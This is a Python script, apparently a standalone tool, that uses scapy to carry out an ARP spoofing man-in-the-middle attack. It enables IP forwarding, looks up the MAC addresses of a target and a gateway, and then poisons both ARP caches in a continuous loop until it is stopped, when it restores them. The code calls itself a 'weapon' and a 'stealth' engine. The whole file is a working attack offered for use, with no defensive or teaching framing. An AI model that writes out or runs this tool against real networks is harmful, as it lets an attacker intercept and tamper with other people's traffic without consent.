import scapy.all as scapy
import time
import sys
import os

# --- PRE-FLIGHT CHECKS ---
def check_privileges():
    if os.getuid() != 0:
        sys.exit("[!] ERROR: This weapon requires ROOT privileges.")

def enable_ip_forwarding(state=True):
    # Handling IP Forwarding (System-level requirement)
    val = "1" if state else "0"
    os.system(f"echo {val} > /proc/sys/net/ipv4/ip_forward")
    print(f"[*] IP Forwarding {'Enabled' if state else 'Disabled'}")

# --- CORE LOGIC ---
def get_mac(ip, retry=3):
    # Validation & Retry Logic for Stability
    for _ in range(retry):
        try:
            arp_request = scapy.ARP(pdst=ip)
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            answered_list = scapy.srp(broadcast/arp_request, timeout=2, verbose=False)[0]
            if answered_list:
                return answered_list[0][1].hwsrc
        except Exception:
            continue
    return None

def spoof(target_ip, target_mac, spoof_ip):
    # Direct spoofing packet crafting
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(dest_ip, source_ip):
    # Restoration Logic to fix the network after attack
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    if dest_mac and source_mac:
        packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, count=4, verbose=False)

# --- EXECUTION ---
def launch(target_ip, gateway_ip):
    check_privileges()
    enable_ip_forwarding(True)
    
    print(f"[*] Validating targets...")
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    
    if not target_mac or not gateway_mac:
        sys.exit("[!] FAILED: Target or Gateway unresponsive. Check ARP cache.")

    print(f"[🔥] X🌍PACKET™ STEALTH MODE ACTIVE. Poisoning {target_ip}...")
    try:
        sent_packets_count = 0
        while True:
            spoof(target_ip, target_mac, gateway_ip)
            spoof(gateway_ip, gateway_mac, target_ip)
            sent_packets_count += 2
            print(f"\r[+] Packets Sent: {sent_packets_count}", end="")
            time.sleep(2) # Stability Delay
    except KeyboardInterrupt:
        print("\n[!] SHUTDOWN DETECTED. Restoring Network State...")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        enable_ip_forwarding(False)
        print("[✓] Network Restored. Mission Logged.")

if __name__ == "__main__":
    if len(sys.argv) == 3:
        launch(sys.argv[1], sys.argv[2])
    else:
        print("Usage: sudo python3 stealth_arp_engine.py <Target_IP> <Gateway_IP>")
